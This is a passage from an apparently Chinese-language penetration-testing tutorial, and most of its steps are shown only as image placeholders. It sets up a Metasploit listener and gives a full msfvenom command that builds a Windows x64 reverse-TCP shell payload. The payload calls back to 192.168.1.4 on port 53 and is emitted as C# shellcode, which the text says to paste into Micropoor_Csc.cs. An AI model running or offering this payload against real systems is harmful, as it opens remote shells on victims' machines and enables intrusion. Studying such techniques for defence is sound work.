...
### 配置攻击机msf：
![](/img/11038c8eb1bb179e7f838fd9cacc18bc.jpg)

### 配置payload：
```bash
msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp
```
![](/img/0d4d8972d612f1578e72bbfd6b9acd17.jpg)

copy buf 到 Micropoor_Csc.cs shellcode 中。  
![](/img/9e59f8c6977c4a11fa1cc86996043b31.jpg)
...
```
![](/img/04e49b7638caec7568dd6d7957b2e701.jpg)
